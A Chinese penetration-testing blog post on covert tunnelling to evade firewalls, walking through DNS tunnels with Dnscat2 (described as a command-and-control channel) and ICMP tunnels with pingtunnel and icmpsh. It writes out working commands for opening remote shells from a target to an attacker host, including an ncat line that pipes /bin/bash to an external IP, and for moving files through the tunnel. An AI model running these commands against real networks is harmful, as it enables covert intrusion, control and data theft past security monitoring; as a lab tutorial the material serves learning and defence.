<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="王大大">


    <meta name="subtitle" content="成长的路上，请不要忘记善良。">




<title>隧道那点事儿 | Welcome</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 5.3.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">WangDaDa&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">WangDaDa&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">隧道那点事儿</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">王大大</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">December 23, 2021&nbsp;&nbsp;14:16:50</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/category/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>什么是隧道？<br>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断.那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式.防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信.当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上.</p>
<h2 id="隧道分类"><a href="#隧道分类" class="headerlink" title="隧道分类"></a>隧道分类</h2><ul>
<li>网络层：IPV6隧道、ICMP隧道</li>
<li>传输层：TCP隧道、UDP隧道、常规端口转发</li>
<li>应用层：SSH隧道、HTTP/S隧道、DNS隧道</li>
</ul>
<h2 id="隧道连通判断"><a href="#隧道连通判断" class="headerlink" title="隧道连通判断"></a>隧道连通判断</h2><p>在架设隧道前，在条件允许的情况下，最好先进行内网相关协议连通性的判定，由此来确认搭建哪种隧道，各类隧道的协议连通性判定方法如下.</p>
<ul>
<li>TCP协议<ul>
<li>使用瑞士军刀——netcat，命令执行 <strong>nc ip/域名 port</strong> 来判定.</li>
</ul>
</li>
<li>HTTP协议<ul>
<li>使用curl命令，执行 <strong>curl IP:端口</strong> ，若远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息.</li>
</ul>
</li>
<li>CIMP协议<ul>
<li>使用ping命令，执行 <strong>ping ip/域名</strong> .</li>
</ul>
</li>
<li>DNS协议<ul>
<li>检测DNS连通性常用的命令为 <strong>nslookup</strong> 和 <strong>dig</strong> ，用 <strong>nslookup IP</strong> 或 <strong>dig IP</strong> 来判定.</li>
</ul>
</li>
</ul>
<h2 id="常用隐匿性隧道搭建"><a href="#常用隐匿性隧道搭建" class="headerlink" title="常用隐匿性隧道搭建"></a>常用隐匿性隧道搭建</h2><h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>常用工具有 <strong>Dns2tcp</strong> ， <strong>iodine</strong> ， <strong>Dnscat2</strong> ， <strong>OzymanDNS</strong> 等等，这里以 <strong>Dnscat2</strong> 为例示范。</p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Dnscat2定位是一个封装在DNS协议中加密的命令与控制（C&amp;C）信道。使用C/S架构，Client位于感染主机，而Server位于权威域名服务器上，若没有权威域名服务器，则可以采用直连模式。<br>其项目地址为 <a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a> 。</p>
<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>项目拉取到本地 <code>git clone https://github.com/iagox86/dnscat2.git</code><br>接下来安装依赖，进入程序 <strong>server</strong> 目录，执行以下命令来安装Dnscat2的主要依赖。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install bundler</span><br><span class="line">sudo bundle install</span><br></pre></td></tr></table></figure>
<p><img src="yilai.png" alt="安装依赖"></p>
<p>依赖安装完毕后，使用 <code>sudo ruby dnscat2.rb</code> 来启动服务端，启动后，Dnscat2会生成一个随机字符串 <strong>secret</strong> 来防范中间人攻击，同时该参数也可自己进行设置。<br><img src="server.png" alt="server启动"></p>
<p>服务端启动后，根据成功启动后提供的命令行，来启动客户端。<br>客户端进入 <strong>Dnscat2</strong> 的 <strong>Client</strong> 目录，Windows下使用VS进行编译，Linux下使用 <code>make</code> 进行编译即可。<br><img src="make.png" alt="make"></p>
<p>执行服务端展示的命令，将IP替换为服务端IP运行即可，即在client目录运行<code>./dnscat --dns server=your-vps-ip,port=53 --secret=7e4b723bda4182ca12497ef1d2426b1f</code><br><img src="client.png" alt="client.png"></p>
<p>连接成功后，服务端执行以下命令来获取客户端机器shell.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dnscat2&gt; session -i 1</span><br><span class="line">command 1&gt; shell</span><br><span class="line">command 2&gt; session -i 2</span><br></pre></td></tr></table></figure>
<p><img src="shell.png" alt="shell"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>即使是在限制非常严格的情况下，DNS流量也应该是允许放行的.我们就可以利用DNS隧道技术在目标主机和我们的C&amp;C服务器之间建立连接.命令和信息都包含在DNS查询和识别中，这也是很难检测的原因，即使任意命令就隐藏在非常显眼的地方，但是它们被认为是合法的流量，也很难检测出来.Dnscat2也正是利用了这一点才成为了一个非常不错的攻击工具.</p>
<h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>两台机器间，除了允许 icmp 通信（单向或互相 ping），其他的 tcp/udp 端口一律不允许，此时我们就可考虑利用 icmp 隧道进行穿透.<br>使用icmp隧道可以轻松穿透 tcp/udp 四层封锁，实现icmp的一些工具如下：</p>
<ul>
<li>icmpsh</li>
<li>PingTunnel</li>
<li>icmptunnel</li>
<li>powershell icmp<br>以上工具适用于不同的场景，需要根据不同的网络环境进行选择使用。</li>
</ul>
<h3 id="icmp单向出网"><a href="#icmp单向出网" class="headerlink" title="icmp单向出网"></a>icmp单向出网</h3><p>此场景下，靶机仅仅可以icmp进行出网，即单向ping，这种情况使用 <strong>pingtunnel</strong> 来搭建icmp隧道。<br>由于靶机和attack机器， <strong>靶机可以ping attack机器，attack机器无法ping通靶机</strong> ，所以此场景下attack机器作为隧道的 <strong>server</strong> 端，等待连接。靶机作为 icmp 的 <strong>client</strong> 端，主动连接 attack 机器。</p>
<p>attack机器开启ICMP服务端:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https:&#x2F;&#x2F;github.com&#x2F;esrrhs&#x2F;pingtunnel&#x2F;releases&#x2F;download&#x2F;2.6&#x2F;pingtunnel_linux_amd64.zip</span><br><span class="line">sudo unzip pingtunnel_linux_amd64.zip</span><br><span class="line">echo 1 &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all  #关闭系统默认的 ping（可选）</span><br><span class="line">sudo .&#x2F;pingtunnel -type server -key 457864 # -key用于设置密码，默认为0</span><br></pre></td></tr></table></figure>
<p><img src="icmp1.png" alt="icmp1"></p>
<p>靶机开启ICMP客户端:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;pingtunnel -type client -l :4455 -s 42.192.89.33 -t 42.192.89.33:8888 -tcp 1 -key 457864  </span><br><span class="line">命令意思是，监听本地4455端口，发送到4455的流量将通过ICMP隧道转发到42.192.89.33服务器的8888端口。</span><br></pre></td></tr></table></figure>
<p><img src="icmp2.png" alt="icmp2"><br>由此，icmp隧道搭建成功。<br>使用上，可以使用nc进行双方的通信，例如文件传输，attack 机器上在本地8888端口开启nc服务，传输文件，等待连接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox nc -lp 8888 &lt; demo.txt  # busybox nc -lp 8888 &gt; demo.txt 反向接收</span><br></pre></td></tr></table></figure>
<p><img src="icmp3.png" alt="icmp3"></p>
<p>靶机使用nc监听本地4455端口，接收文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 127.0.0.1 4455 &gt; demo.txt # nc -nv 127.0.0.1 4455 &lt; demo.txt 反向发送</span><br></pre></td></tr></table></figure>
<p><img src="icmp4.png" alt="icmp4"></p>
<h3 id="传输bash"><a href="#传输bash" class="headerlink" title="传输bash"></a>传输bash</h3><p>server端执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;pingtunnel -type server -key 457864</span><br></pre></td></tr></table></figure>
<p>nc执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
<p><img src="icmp5.png" alt="icmp5"></p>
<p>client端执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;pingtunnel -type client -l :8888 -s 42.192.89.33 -t 42.192.89.33:8888 -tcp 1 -key 457864</span><br></pre></td></tr></table></figure>
<p>nc执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat 42.192.89.33 8888 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><img src="icmp6.png" alt="icmp6"></p>
<h3 id="icmp双向通信"><a href="#icmp双向通信" class="headerlink" title="icmp双向通信"></a>icmp双向通信</h3><p>此场景下，靶机与攻击机器可以正常相互进行icmp（ping）通信，也就是可以icmp出网，此时可进行icmp隧道搭建进行下一步攻击。<br>使用工具: <strong>icmpsh</strong><br>其详细参数如下：</p>
<ul>
<li>-t         host主机IP地址，用于向其发送ping请求（该选项为强制性的）</li>
<li>-r         发送包含字符串“ Test1234”的单个测试icmp请求，然后退出（用于测试连接）</li>
<li>-d         毫秒请求之间的延迟（以毫秒为单位）</li>
<li>-o        毫秒响应超时（以毫秒为单位）</li>
<li>-b        空格数限制（退出前未答复的icmp请求）</li>
<li>-s        字节最大数据缓冲区大小（以字节为单位）</li>
</ul>
<h3 id="工具部署"><a href="#工具部署" class="headerlink" title="工具部署"></a>工具部署</h3><p><strong>icmpsh</strong> 工具使用简单，是一个跨平台工具，控制端可以使用python、pl等脚本调用，被控端由一个win32的exe启动，由此该程序只可以在windows上进行调用，且被控端运行不需要管理员权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;bdamele&#x2F;icmpsh.git</span><br><span class="line">apt-get install python-impacket		 # 安装库</span><br></pre></td></tr></table></figure>
<p>若运行报错，更新下APT库就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">apt-get install python-impacket</span><br></pre></td></tr></table></figure>
<p>若python2需要安装pip，运行以下命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install wget python-is-python2 	# 安装wget和python2</span><br><span class="line">wget https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;pip&#x2F;2.7&#x2F;get-pip.py</span><br><span class="line">python get-pip.py</span><br></pre></td></tr></table></figure>
<p>若还是不行，就使用pip安装。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install impacket</span><br></pre></td></tr></table></figure>
<p>因为icmpsh工具需要替代系统本身的ping命令的应答程序，所以需要关闭本地系统的icmp答应，否则shell的运行可能不稳定，使用以下命令关闭</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1		</span><br><span class="line">echo 1 &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all</span><br></pre></td></tr></table></figure>
<p>部署完毕后，靶机运行exe受控文件 (靶机IP: <strong>172.16.184.4</strong> , 攻击机IP: <strong>172.16.184.8</strong> )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;icmpsh.exe -t 172.16.184.8(攻击机IP)</span><br></pre></td></tr></table></figure>
<p><img src="icmp7.png" alt="icmp7.png"></p>
<p>攻击机运行命令进行反弹靶机shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python icmpsh.py 172.16.184.8(攻击机IP) 172.16.184.8(靶机IP)</span><br></pre></td></tr></table></figure>
<p><img src="icmp8.png" alt="icmp8.png"></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>王大大</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://classbluer.github.io/2021/12/23/%E9%9A%A7%E9%81%93%E9%82%A3%E7%82%B9%E4%BA%8B%E5%84%BF/">http://classbluer.github.io/2021/12/23/%E9%9A%A7%E9%81%93%E9%82%A3%E7%82%B9%E4%BA%8B%E5%84%BF/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tag/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"># 隧道技术</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/01/11/Weblogic%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/">Weblogic漏洞汇总</a>
            
            
            <a class="next" rel="next" href="/2021/12/22/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%BA%BF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/">从零到亿代码审计（一）</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© 王大大 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
